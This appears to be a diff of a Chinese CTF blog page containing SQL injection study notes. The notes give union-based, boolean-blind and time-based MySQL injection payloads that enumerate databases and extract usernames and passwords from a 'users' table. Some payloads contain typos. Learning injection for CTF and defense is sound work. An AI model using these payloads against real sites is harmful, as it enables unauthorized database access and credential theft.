@@ -15,12 +15,21 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="C1em0's Blog">
-<meta property="og:url" content="http://yoursite.com/tags/渗透/index.html">
+<meta name="description" content="1.基础知识准备：sql注入的分类
+基于从服务器的响应：1.基于错误的sql注入；2.联合查询的类型；">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySql 注入杂记">
+<meta property="og:url" content="http://yoursite.com/2017/10/06/mysql/index.html">
 <meta property="og:site_name" content="C1em0's Blog">
+<meta property="og:description" content="1.基础知识准备：sql注入的分类
+基于从服务器的响应：1.基于错误的sql注入；2.联合查询的类型；">
+<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/mysql.jpg">
+<meta property="og:updated_time" content="2017-10-06T03:54:38.467Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="C1em0's Blog">
+<meta name="twitter:title" content="MySql 注入杂记">
+<meta name="twitter:description" content="1.基础知识准备：sql注入的分类
+基于从服务器的响应：1.基于错误的sql注入；2.联合查询的类型；">
+<meta name="twitter:image" content="http://ourd90bac.bkt.clouddn.com/mysql.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -52,7 +61,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Tag: 渗透 | C1em0&#39;s Blog</title>
+<title>MySql 注入杂记 | C1em0&#39;s Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -62,9 +71,9 @@
         fancybox: true,
         animate: true,
         isHome: false,
-        isPost: false,
+        isPost: true,
         isArchive: false,
-        isTag: true,
+        isTag: false,
         isCategory: false,
         fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
         scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
@@ -267,89 +276,213 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap">
+      <div class="body-wrap"><article id="post-mysql" class="article article-type-post" itemscope itemprop="blogPost">
   
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2017/10/06/mysql/" class="archive-article-date">
-      <time datetime="2017-10-06T03:44:20.000Z" itemprop="datePublished">10-06</time>
+    <div class="article-meta">
+      <a href="/2017/10/06/mysql/" class="article-date">
+      <time datetime="2017-10-06T03:44:20.000Z" itemprop="datePublished">2017-10-06</time>
 </a>
 
 
-        </div>
-         
+    </div>
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/10/06/mysql/">MySql 注入杂记</a>
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      MySql 注入杂记
     </h1>
   
 
-        <div class="article-info info-on-archive">
-          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
 
-          
+        
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
     </div>
 
-        </div>
         <div class="clearfix"></div>
-    </header>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><img src="http://ourd90bac.bkt.clouddn.com/mysql.jpg" alt=""></p>
+<h3 id="1-基础知识准备："><a href="#1-基础知识准备：" class="headerlink" title="1.基础知识准备："></a>1.基础知识准备：</h3><h4 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h4><ul>
+<li><p>基于从服务器的响应：<br>1.基于错误的sql注入；<br>2.联合查询的类型；</p>
+<a id="more"></a>
+<p>3.SQL盲注：</p>
+<pre><code>基于布尔的盲注
+基于时间的盲注
+基于报错的盲注
+</code></pre></li>
+<li><p>基于注入的数据类型：<br>1.基于字符串<br>2.基于数字</p>
+</li>
+<li><p>基于程度和顺序<br>1.一阶注入；<br>2.二阶注入；<br>3.</p>
+</li>
+<li>基于注入位置<br>1.基于用户输入表单域的注入；<br>2.通过cookie注入；<br>3.通过服务器变量注入。（基于头部信息注入）</li>
+</ul>
+<h4 id="MySQL系统函数"><a href="#MySQL系统函数" class="headerlink" title="MySQL系统函数"></a>MySQL系统函数</h4><p>1.version() :mysql版本信息<br>2.user():数据库用户名<br>3.database():数据库名<br>4.@@datadir():数据库路径<br>5.@@version_compile_os():操作系统版本</p>
+<h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><p>1.concat(str1,str2,….):没有分隔符地连接字符串<br>2.concat_ws(separator.str1,str2,…)含有分隔符地连接字符串<br>3.group_concat(str1,str2,…):连接一族所有的字符串，并用逗号分隔</p>
+<h3 id="2-GET联合查询（有回显报错）"><a href="#2-GET联合查询（有回显报错）" class="headerlink" title="2.GET联合查询（有回显报错）"></a>2.GET联合查询（有回显报错）</h3><p>1.测试<code>id</code>值后的闭合符号，以及注释符。</p>
+<blockquote>
+<p>常见注释：<br>–+<br>#<br>`</p>
+</blockquote>
+<p>2.<code>order by</code>联合查询，找出相应的列数</p>
+<p>3.<code>union select</code>联合查询注入。如下：</p>
+<p><strong>查询所有数据库</strong>：<code>id=-1&#39; union select 1, group_concat(table_schema),3 from information_schema.schemata--+</code></p>
+<p>注：这里我们假设查询出<code>security</code>数据库</p>
+<p><strong>查询表名（table）</strong>：<code>id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
+<p><strong>查询列名（column）</strong>：<code>id=-1&#39; union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
+<p><strong>查询字段名</strong>：<code>id=-1 union select 1,username,password from users where id=2--+</code></p>
+<p>###3. 盲注的相关知识</p>
+<ul>
+<li>基于布尔盲注—–构造逻辑结构判断</li>
+</ul>
+<p>相关字符串截取函数：<br>1.<code>left(database(),1)&gt;&#39;s&#39;</code>   ：database()显示数据库名，left(a,b)从左侧截取a的前b位<br>2.<code>ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1)1,1)--+</code>：substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。<br>3.<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
+BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字符串a的c位。ord()函数和ascii()函数一样将字符转为ascii码。</p>
+<ul>
+<li>基于报错的MySQL盲注</li>
+<li>基于时间的盲注<br><code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code>if(a,b,c)若a成立，就执行c，不成立就执行b</li>
+</ul>
+<h3 id="GET布尔盲注"><a href="#GET布尔盲注" class="headerlink" title="GET布尔盲注"></a>GET布尔盲注</h3><ul>
+<li><p>判断数据库<br>可以使用两种函数判断：<br>1.<code>id=1&#39; and left(database(),1)=&#39;s&#39;--+</code>：直接判断数据库的名字，缺点就是受限于left函数的用法，不能进行每一位的单个字符的判断。<br>2.<code>id=1&#39; and ascii(substr(database(),1,1))=89--+</code>：和上面的语句一样用于判断数据库名，在使用脚本时用此句就行。</p>
+</li>
+<li><p>爆数据库下的表名<br><code>id=1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=136--+</code><br><em>解释</em>：<code>limit 0,1</code>中0是表示从第一个表（若数据库有多个表）开始，接着的1表示获取第一个。</p>
+</li>
+<li><p>获取字段内的值（获取字段名就和上面获取表名的操作是一样的）<br>假设我们从上一步的操作中获取了一个名叫<code>users</code>的字段，一般想来这个字段中肯定含有我们想要得到的用户名和密码，所以这里就可以用到正则注入。</p>
+</li>
+</ul>
+<p>1.<code>id=1&#39; and 1=(select 1 frominformation schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+</code></p>
+<p><strong>注意</strong>：select后的1表示我们查询的是这个字段的第一个值，若我们想查询其他字段中的值，直接更换这里的’users’即可，所以这里的limit 0,1起不到限定作用，可有可无。</p>
+<p>2.使用<code>ord()</code>与<code>mid()</code>函数</p>
+<p>解释：这里的mid()函数与substr()函数类似，有一样的功能。函数原型为：<code>MID(ColumnName, Start [, Length])</code>对字符串从start位置开始截取相应的长度。这里我就可以在substr()被禁的情况下做替换。</p>
+
+      
+    </div>
+    
   </div>
-</article>
   
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-          <div class="article-meta">
-              <a href="/2017/08/16/Blackb0x-服务器渗透/" class="archive-article-date">
-      <time datetime="2017-08-16T08:15:40.000Z" itemprop="datePublished">08-16</time>
-</a>
-
-
-        </div>
-         
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/08/16/Blackb0x-服务器渗透/">Blackb0x 服务器渗透</a>
-    </h1>
-  
-
-        <div class="article-info info-on-archive">
-          
-
-          
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/10/06/mysql/">MySql 注入杂记</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">C1em0</a></p>
+        <p><span>发布时间:</span>2017-10-06, 11:44:20</p>
+        <p><span>最后更新:</span>2017-10-06, 11:54:38</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/10/06/mysql/" title="MySql 注入杂记">http://yoursite.com/2017/10/06/mysql/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/10/06/mysql/　　作者: C1em0" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
     </div>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/08/16/Blackb0x-服务器渗透/">
+                    Blackb0x 服务器渗透
+                </a>
+            </div>
+        
+    </nav>
+
+  
 </article>
-  
-  
-    </div></section>
-  
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-基础知识准备："><span class="toc-number">1.</span> <span class="toc-text">1.基础知识准备：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql注入的分类"><span class="toc-number">1.1.</span> <span class="toc-text">sql注入的分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL系统函数"><span class="toc-number">1.2.</span> <span class="toc-text">MySQL系统函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#函数介绍"><span class="toc-number">1.3.</span> <span class="toc-text">函数介绍</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-GET联合查询（有回显报错）"><span class="toc-number">2.</span> <span class="toc-text">2.GET联合查询（有回显报错）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET布尔盲注"><span class="toc-number">3.</span> <span class="toc-text">GET布尔盲注</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"MySql 注入杂记　| C1em0's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
 
     
 
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/08/16/Blackb0x-服务器渗透/" title="下一篇: Blackb0x 服务器渗透">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/06/mysql/">MySql 注入杂记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/Blackb0x-服务器渗透/">Blackb0x 服务器渗透</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
 </div>
       <footer id="footer">
     <div class="outer">
